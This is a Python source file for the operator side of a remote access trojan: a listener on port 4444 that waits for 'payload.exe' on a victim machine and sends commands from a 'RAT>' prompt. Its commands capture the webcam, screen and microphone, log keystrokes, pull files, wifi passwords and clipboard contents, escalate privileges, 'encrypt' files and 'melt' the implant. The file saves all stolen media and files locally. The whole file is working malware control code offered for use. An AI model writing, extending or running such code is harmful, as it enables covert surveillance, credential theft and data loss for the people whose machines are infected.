import socket
import json
import base64
import os
from datetime import datetime

def save_file(content, filename):
    try:
        with open(filename, "wb") as f:
            f.write(base64.b64decode(content))
        return True
    except:
        return False

def start_listener():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 4444))
    s.listen(1)
    print(f"[*] Listening on 10.2.0.2:4444... (Run payload.exe on target)")
    
    os.makedirs("screenshots", exist_ok=True)
    os.makedirs("webcam_shots", exist_ok=True)
    os.makedirs("audio_recordings", exist_ok=True)
    
    while True:
        try:
            conn, addr = s.accept()
            print(f"[+] Connection from {addr[0]}")
            
            try:
                sysinfo = json.loads(conn.recv(999999).decode())
                print("\n=== SYSTEM INFO ===")
                print(json.dumps(sysinfo, indent=4))
            except:
                print("[!] Could not receive system info")
            
            while True:
                cmd = input("\nRAT> ")
                if not cmd:
                    continue
                    
                try:
                    conn.send(cmd.encode())
                    
                    if cmd.lower() == "exit":
                        conn.close()
                        break
                        
                    data = conn.recv(9999999).decode()
                    
                    if cmd == "webcam":
                        filename = f"webcam_shots/webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                        if save_file(data, filename):
                            print(f"[+] Webcam saved to {filename}")
                        else:
                            print("[!] Failed to save webcam")
                    elif cmd == "screenshot":
                        filename = f"screenshots/screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                        if save_file(data, filename):
                            print(f"[+] Screenshot saved to {filename}")
                        else:
                            print("[!] Failed to save screenshot")
                    elif cmd.startswith("record_mic"):
                        filename = f"audio_recordings/audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
                        if save_file(data, filename):
                            print(f"[+] Audio recording saved to {filename}")
                        else:
                            print("[!] Failed to save audio recording")
                    elif cmd.startswith("record_screen"):
                        filename = f"screenshots/recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi"
                        if save_file(data, filename):
                            print(f"[+] Screen recording saved to {filename}")
                        else:
                            print("[!] Failed to save screen recording")
                    elif cmd == "sysinfo":
                        try:
                            print(json.dumps(json.loads(data), indent=4))
                        except:
                            print(data)
                    elif cmd == "autodownload":
                        try:
                            files = json.loads(data)
                            print(f"[+] Downloaded {len(files)} files:")
                            for file in files:
                                if save_file(file["content"], file["name"]):
                                    print(f" - {file['name']} ({file['size']} bytes)")
                                else:
                                    print(f" - Failed to save {file['name']}")
                        except:
                            print("[!] Invalid file data received")
                    elif cmd.startswith("file_list"):
                        try:
                            print("Files:", ", ".join(json.loads(data)))
                        except:
                            print(data)
                    elif cmd.startswith("file_read"):
                        filename = input("Save as: ") or "downloaded_file"
                        if save_file(data, filename):
                            print(f"[+] Saved as {filename}")
                        else:
                            print("[!] Failed to save file")
                    elif cmd.startswith("encrypt"):
                        print(data)
                    elif cmd.startswith("decrypt"):
                        print(data)
                    elif cmd.startswith("terminate"):
                        print(data)
                    elif cmd == "escalate":
                        print(data)
                    elif cmd == "shutdown":
                        print(data)
                    elif cmd == "restart":
                        print(data)
                    elif cmd == "logoff":
                        print(data)
                    elif cmd == "wifi_passwords":
                        print(data)
                    elif cmd.startswith("port_scan"):
                        print(data)
                    elif cmd == "keylogger start":
                        print(data)
                    elif cmd == "keylogger stop":
                        print(data)
                    elif cmd == "keylogger dump":
                        print(data)
                    elif cmd == "clipboard_get":
                        print("Clipboard contents:", data)
                    elif cmd.startswith("clipboard_set"):
                        print(data)
                    elif cmd == "melt":
                        print(data)
                    elif cmd == "help":
                        print(data)
                    else:
                        print(data)
                except Exception as e:
                    print(f"[!] Error: {str(e)}")
                    break
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")
            break
        except Exception as e:
            print(f"[!] Listener error: {str(e)}")
            continue

if __name__ == "__main__":
    start_listener()
